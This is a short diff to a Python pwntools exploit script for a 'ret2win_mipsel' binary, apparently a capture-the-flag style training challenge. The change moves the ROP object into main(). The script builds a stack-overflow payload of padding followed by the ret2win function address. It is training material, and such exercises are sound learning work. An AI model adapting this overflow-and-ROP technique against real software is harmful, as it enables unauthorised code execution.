@@ -1,7 +1,6 @@
 from pwn import *
 
 elf = ELF("ret2win_mipsel")
-rop = ROP(elf)
 
 context.binary = elf
 context.terminal = ['konsole', '-e']
@@ -24,6 +23,7 @@ BUFFER_SIZE = 32
 READ_SIZE = 56
 
 def main():
+    rop = ROP(elf)
     rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
     rop.raw(elf.symbols.ret2win)
     payload = rop.chain()
